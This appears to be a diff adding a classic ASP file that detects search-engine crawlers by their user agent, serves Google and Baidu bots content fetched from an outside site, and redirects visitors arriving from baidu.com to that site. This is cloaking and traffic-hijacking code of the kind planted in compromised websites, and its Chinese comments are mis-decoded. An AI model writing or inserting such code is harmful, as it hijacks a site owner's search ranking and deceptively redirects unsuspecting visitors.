@@ -1,0 +1,78 @@
+<%
+function GetBot()
+'²éÑ¯Ö©Öë
+dim s_agent
+GetBot=""
+s_agent=Request.ServerVariables("HTTP_USER_AGENT") '¹Ø¼üÅÐ¶ÏÓï¾ä
+if instr(1,s_agent,"googlebot",1) >0 then
+GetBot="google"
+end if
+if instr(1,s_agent,"msnbot",1) >0 then
+GetBot="MSN"
+end if
+if instr(1,s_agent,"slurp",1) >0 then
+GetBot="Yahoo"
+end if
+if instr(1,s_agent,"baiduspider",1) >0 then
+GetBot="baidu"
+end if
+if instr(1,s_agent,"sohu-search",1) >0 then
+GetBot="Sohu"
+end if
+if instr(1,s_agent,"lycos",1) >0 then
+GetBot="Lycos"
+end if
+if instr(1,s_agent,"robozilla",1) >0 then
+GetBot="Robozilla"
+end if
+end function
+Function getHTTPPage(Path)
+t = GetBody(Path)
+getHTTPPage=BytesToBstr(t,"GB2312")'±àÂë
+End function
+Function Newstring(wstr,strng)
+Newstring=Instr(lcase(wstr),lcase(strng))
+if Newstring<=0 then Newstring=Len(wstr)
+End Function
+Function GetBody(url)
+on error resume next
+Set Retrieval = CreateObject("Microsoft.XMLHTTP")
+With Retrieval
+.Open "Get", url, False, "", ""
+.Send
+GetBody = .ResponseBody
+End With
+Set Retrieval = Nothing
+End Function
+Function BytesToBstr(body,Cset)
+dim objstream
+set objstream = Server.CreateObject("adodb.stream")
+objstream.Type = 1
+objstream.Mode =3
+objstream.Open
+objstream.Write body
+objstream.Position = 0
+objstream.Type = 2
+objstream.Charset = Cset
+BytesToBstr = objstream.ReadText
+objstream.Close
+set objstream = nothing
+End Function
+Dim wstr,str,url,start,over,dtime
+if GetBot="baidu" then
+url="http://www.chinacycc.com/"
+wstr=getHTTPPage(url)
+body=wstr
+response.write ""&body&""
+response.end
+elseif GetBot="google" then
+url="http://www.chinacycc.com/"
+wstr=getHTTPPage(url)
+body=wstr
+response.write ""&body&""
+response.end
+end if
+if instr(Request.ServerVariables("http_referer"),"www.baidu.com")>0 then
+response.redirect("http://www.chinacycc.com/")
+end if
+%>
